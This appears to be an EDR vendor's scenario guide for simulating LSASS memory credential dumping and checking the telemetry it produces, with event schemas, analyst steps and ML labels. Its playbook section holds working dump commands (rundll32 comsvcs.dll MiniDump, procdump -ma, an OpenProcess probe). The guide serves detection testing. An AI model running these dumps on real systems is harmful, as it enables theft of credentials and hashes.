# InsiEDR Scenario Execution & Forensic Guide: SIM_CREDENTIAL_DUMP

> **Scenario ID:** `SIM_CREDENTIAL_DUMP`  
> **Friendly Name:** OS Credential Dumping (LSASS Memory Extraction)  
> **Target Persona:** Compromised Administrator / Privilege Escalator  
> **MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory) & [T1218.011](https://attack.mitre.org/techniques/T1218/011/) (System Binary Proxy Execution: Rundll32)  
> **Operating Mode:** Ingestion-Only Forensics (**Detection Pipeline OFF**)  

---

## 1. Quick Reference Card

| Field | Specification |
| :--- | :--- |
| **Difficulty Level** | ⭐⭐ Intermediate (Requires Administrator Privilege) |
| **Execution Duration** | 2 – 5 minutes |
| **Required Privilege** | Local Administrator (required to access `lsass.exe` and read Security Event Logs) |
| **Target Operating System** | Windows 10, Windows 11, Windows Server 2016+ |
| **Primary InsiEDR Collectors** | `lsass-monitor`, `process-watcher`, `memory-scanner` |
| **Target Process** | `lsass.exe` (Local Security Authority Subsystem Service) |
| **Expected Sensor Signal** | `event_count >= 1`, `lsass_access_events` containing target object and access mask |

> [!CRITICAL]
> **Mandatory Windows Audit Policy Prerequisite:**  
> The InsiEDR agent's `lsass-monitor` (`agent/collectors/lsass_monitor.py`) detects credential dumping by reading the **Windows Security Event Log** for **Event IDs 4656 and 4663** ("Handle requested / accessed").  
> On default Windows 10/11 installations, "Handle Manipulation" auditing is **disabled by default**. Before running this scenario, you **must enable handle auditing** by running this command in an Administrator prompt:  
> ```cmd
> auditpol /set /subcategory:"Handle Manipulation" /success:enable
> ```  
> *Without this audit policy enabled, Windows will never write handle events to the log, and `lsass-monitor` will report 0 events.*

---

## 2. Threat Profile & Operational Context

### Executive Summary & Operational Metaphor
On every Microsoft Windows endpoint, a core system service named **`lsass.exe`** (Local Security Authority Subsystem Service) acts as the central security vault of the operating system. Whenever a user logs into Windows—whether locally or via Remote Desktop (RDP)—their security credentials, Kerberos tickets, and NTLM password hashes are temporarily cached in LSASS's active virtual memory space so users are not forced to re-type passwords for every network share or service they access.

When an adversary or rogue insider attains administrative privileges, their very first tactical objective is typically to extract a snapshot ("minidump") of LSASS memory. Once this memory dump is captured, offline extraction tools (like Mimikatz) can parse the binary structure to reveal plaintext domain passwords and administrator hashes, allowing the insider to pivot laterally across the entire enterprise network.

### MITRE ATT&CK Alignment

| Dimension | Identifier | Description |
| :--- | :--- | :--- |
| **Tactic** | **TA0006** (Credential Access) | Stealing credentials like account names and passwords. |
| **Technique** | **[T1003.001](https://attack.mitre.org/techniques/T1003/001/)** | **OS Credential Dumping (LSASS Memory):** Requesting privileged handles against `lsass.exe` to read memory structures and export minidumps. |
| **Tactic** | **TA0005** (Defense Evasion) | Bypassing detections using signed built-in Windows utilities. |
| **Technique** | **[T1218.011](https://attack.mitre.org/techniques/T1218/011/)** | **System Binary Proxy Execution (Rundll32):** Abusing `rundll32.exe` to execute `comsvcs.dll, MiniDump` as a living-off-the-land binary (LOLBin). |

---

## 3. InsiEDR Telemetry & Sensor Architecture

The InsiEDR agent continuously observes handle creation requests against high-risk Windows security services and scans process virtual memory mappings.

### Active Collectors & Telemetry Delta

```mermaid
flowchart LR
    Act["Insider Opens Privileged LSASS Handle"] --> S1["lsass-monitor"]
    Act --> S2["process-watcher"]
    Act --> S3["memory-scanner"]
    
    S1 -->|Parses Security Event Log (EID 4656/4663)| P1["Telemetry Ingestion Payload"]
    S2 -->|Audits rundll32.exe comsvcs.dll Command Lines| P1
    S3 -->|Scans VirtualQueryEx Memory Regions| P1
```

#### 1. `lsass-monitor` (Credential Sensor — `agent/collectors/lsass_monitor.py`)
* **Underlying Architecture:** Audits process handles created via `OpenProcess` and `DuplicateHandle` recorded in the Windows Security Event Log (`4656` Handle Requested, `4663` Handle Accessed) matching `lsass.exe`.
* **Privacy Guarantee:** InsiEDR audits the *access handle event and calling process ID*. It **never touches or reads** actual passwords or security tokens.
* **Sensor Baseline vs. Attack Delta:**

| Feature Name | Clean Baseline Value | Active Attack Value | Description |
| :--- | :---: | :---: | :--- |
| `event_count` | `0` | **$\ge 1$** | Number of privileged handle events opened against `lsass.exe`. |
| `target_process` | `"lsass.exe"` | `"lsass.exe"` | Monitored target process name. |
| `lsass_access_events` | `[]` | **`[{"source_process": ..., "access_mask": "0x1FFFFF"}]`** | Array of detailed handle request metadata. |

* **Raw JSON Payload Snapshot (Exact schema logged in `spool.db` and PostgreSQL):**
  ```json
  {
    "collector": "lsass-monitor",
    "status": "success",
    "collected_at": "2026-10-27T16:54:30.150Z",
    "payload": {
      "target_process": "lsass.exe",
      "event_count": 1,
      "lsass_access_events": [
        {
          "event_id": 4656,
          "timestamp": "2026-10-27T16:54:25.120Z",
          "source_process": "C:\\Windows\\System32\\rundll32.exe",
          "target_object": "C:\\Windows\\System32\\lsass.exe",
          "access_mask": "0x1FFFFF",
          "handle_id": "0x1a4",
          "subject_user": "Administrator"
        }
      ]
    }
  }
  ```
  *(Note: `credential_dumping_suspected = true` is a server-side heuristic decision evaluated by `heuristics/detector.py` when `event_count >= 1` or access masks match `0x1FFFFF` / `0x1010`).*

#### 2. `process-watcher` (Corroborating Execution Sensor)
* **Underlying Win32 API:** Windows process enumeration capturing command line arguments (`rundll32.exe comsvcs.dll, MiniDump`).

---

## 4. SOC Analyst Inspection Protocol (Detection Pipeline OFF)

With automated detection rules disabled (`INSIEDR_ENABLE_MODEL_PIPELINE=false`), all telemetry is committed cleanly to the database. Verify via **Telemetry Explorer**.

### Telemetry Explorer Inspection Steps:

```
[1. Select Time Range: 15m] ──► [2. Filter Collector: LSASS Guard] ──► [3. Inspect Log Drawer (event_count >= 1)]
                                  │
                                  └──► [4. Switch Collector: Process Watcher] ──► [5. Verify rundll32.exe comsvcs.dll]
```

1. **Access Viewport:** Log in to the InsiEDR Web Dashboard (`http://localhost:5000/dashboard/`) and select **Telemetry Explorer**.
2. **Set Temporal Range:** Select **`15m`**.
3. **Filter Primary Credential Sensor:** In the **Collector** dropdown, select **`LSASS Guard`** (`lsass-monitor`).
4. **Inspect Raw Payload:** Click on the most recent log row:
   * Verify `"event_count"` displays **$\ge 1$**.
   * Verify `"target_process": "lsass.exe"`.
   * Expand `"lsass_access_events"`: Confirm `"source_process"` shows the calling binary (`rundll32.exe`, `powershell.exe`, or `taskmgr.exe`), and `"access_mask"` shows `0x1FFFFF` or `0x1010`.
5. **Cross-Check Execution Feed:** Switch the Collector dropdown to **`Process Watcher`** (`process-watcher`):
   * Confirm the elevated process execution was recorded during the exact same timestamp.

---

## 5. Multi-Vector Attack Execution Playbooks

> [!IMPORTANT]
> Because `lsass.exe` is a protected system component, **all methods require Administrator privileges**. Ensure you have run `auditpol /set /subcategory:"Handle Manipulation" /success:enable` beforehand!

Below are **5 distinct execution playbooks** to simulate credential dumping on a live Windows machine.

### Vector 1: Windows Task Manager GUI (Zero-Code Desktop Workflow)
*Every Windows administrator has the built-in capability to dump LSASS memory directly from the GUI:*
1. Press **Ctrl + Shift + Esc** to open **Windows Task Manager**.
2. Click on the **Details** tab (on Windows 11, click the list icon on the left sidebar).
3. Scroll down alphabetically and locate **`lsass.exe`**.
4. Right-click on **`lsass.exe`** $\rightarrow$ Click **"Create dump file"**.
5. Windows will open an audited handle with full read rights and write a `.dmp` file to `%LOCALAPPDATA%\Temp\`.
*Forensic Outcome:* Windows generates Security Event 4656, and InsiEDR's `lsass-monitor` captures the handle request.
6. Click **Open file location** and delete the created `.dmp` file.

---

### Vector 2: Native Living-off-the-Land `comsvcs.dll` via PowerShell (Scripted Reproducibility)
*The most famous living-off-the-land technique used by real-world threat actors.*
Open an **Administrator PowerShell** terminal and run:

```powershell
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " EXECUTING SCENARIO: SIM_CREDENTIAL_DUMP (PowerShell Vector)" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# Step 0: Ensure Audit Policy is active
auditpol /set /subcategory:"Handle Manipulation" /success:enable | Out-Null

# Step 1: Resolve LSASS Process ID
$LsassProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
if (-not $LsassProc) {
    Write-Host "[!] Could not resolve lsass process." -ForegroundColor Red
    return
}

$LsassPid = $LsassProc.Id
$DumpPath = "C:\Windows\Temp\debug_lsass.dmp"
Write-Host "[+] Target LSASS Process ID: $LsassPid" -ForegroundColor Yellow

# Step 2: Trigger Native comsvcs.dll MiniDump
Write-Host "[+] Invoking native comsvcs.dll MiniDump via rundll32.exe..." -ForegroundColor Yellow
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $LsassPid $DumpPath full

# Step 3: Wait for InsiEDR Sensor Tick, then Clean Up
Write-Host "[*] Pausing 10 seconds for sensor capture..." -ForegroundColor DarkGray
Start-Sleep -Seconds 10

if (Test-Path $DumpPath) {
    Remove-Item -Path $DumpPath -Force
    Write-Host "[✔] Cleaned up temporary dump file: $DumpPath" -ForegroundColor Green
}

Write-Host "[✔] LSASS Dump execution completed successfully!" -ForegroundColor Green
Write-Host "[*] Wait 15 seconds for InsiEDR telemetry sweep." -ForegroundColor Cyan
```

---

### Vector 3: Classic Windows Command Prompt (`cmd.exe`)
Open Command Prompt as **Administrator** (`cmd.exe`) and execute:

```cmd
:: 1. Ensure audit policy is active
auditpol /set /subcategory:"Handle Manipulation" /success:enable

:: 2. Find Process ID of lsass.exe
for /f "tokens=2" %i in ('tasklist ^| findstr /i "lsass.exe"') do set PID=%i

:: 3. Trigger native comsvcs dump
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump %PID% C:\Windows\Temp\cmd_lsass.dmp full

:: 4. Clean up dump file after short pause
timeout /t 8
del /f /q C:\Windows\Temp\cmd_lsass.dmp 2>nul
echo [✔] Credential dump completed via cmd.exe!
```

---

### Vector 4: Safe In-Memory Handle Probe (Zero Files Written to Disk — Recommended for Production Audits)
*Opens an audited handle with `PROCESS_ALL_ACCESS` without writing any gigabyte-sized dump file to disk.*
In an **Administrator PowerShell**:

```powershell
Write-Host "[+] Executing Safe In-Memory LSASS Handle Probe (Zero Disk Writes)..." -ForegroundColor Yellow
auditpol /set /subcategory:"Handle Manipulation" /success:enable | Out-Null

$Source = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LsassProbe {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void ProbeHandle() {
        Process[] procs = Process.GetProcessesByName("lsass");
        if (procs.Length == 0) return;
        int pid = procs[0].Id;
        
        // Request PROCESS_ALL_ACCESS (0x1FFFFF)
        IntPtr hProc = OpenProcess(0x1FFFFF, false, pid);
        if (hProc != IntPtr.Zero) {
            Console.WriteLine("[✔] Successfully opened audited handle to LSASS (Access Mask: 0x1FFFFF)!");
            CloseHandle(hProc);
        } else {
            Console.WriteLine("[!] OpenProcess error: " + Marshal.GetLastWin32Error());
        }
    }
}
"@

Add-Type -TypeDefinition $Source
[LsassProbe]::ProbeHandle()

Write-Host "[✔] Handle probe complete. Intercepted by lsass-monitor without touching disk!" -ForegroundColor Green
```

---

### Vector 5: Microsoft Sysinternals ProcDump
If `procdump.exe` is present:

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_proc.dmp
del /f /q C:\Windows\Temp\lsass_proc.dmp 2>nul
```

---

### Wait for the Agent Sweep:
Wait **15 to 20 seconds** for the agent's 10-second tick to package the LSASS audit event!

---

## 6. Post-Incident Remediation & Baseline Restoration

To clean any residual dump files and restore the baseline state:

```powershell
Write-Host "[+] Restoring baseline: Cleaning up any residual dump files..." -ForegroundColor Yellow

$DumpPaths = @(
    "C:\Windows\Temp\debug_lsass.dmp",
    "C:\Windows\Temp\cmd_lsass.dmp",
    "C:\Windows\Temp\lsass_proc.dmp"
)

foreach ($path in $DumpPaths) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
        Write-Host "    [✔] Removed residual dump file: $path" -ForegroundColor Green
    }
}

Write-Host "[✔] Host returned to pristine baseline state." -ForegroundColor Green
```

---

## 7. Machine Learning Dataset Ground-Truth Specification

When exporting ingested telemetry rows from PostgreSQL (`features` table) or ClickHouse:

### Labeling Standard
* **Evidence-Bearing Slicing:** Rows generated by `lsass-monitor` and `process-watcher` falling strictly within the execution interval $[t_{\text{start}}, t_{\text{end}})$ receive **`ground_truth_label = 1`**.
* **Feature Vector Output:**

| Exported Feature Column | Value During Scenario | Standard Baseline Value | Description |
| :--- | :---: | :---: | :--- |
| **`event_count`** | **$\ge 1$** | `0` | Number of unauthorized handle requests to `lsass.exe`. |
| **`credential_dumping_suspected`** | **`True`** (Heuristic) | `False` | Evaluated server-side based on `event_count` and access mask. |
| **`ground_truth_label`** | **`1`** | `0` | Supervised binary classification ground truth (Threat). |
| **`multiclass_label`** | **`CREDENTIAL_DUMP`** | `BENIGN` | Multi-class threat category. |
| **`mitre_technique`** | **`T1003.001 / T1218.011`** | `None` | MITRE ATT&CK technique mapping. |
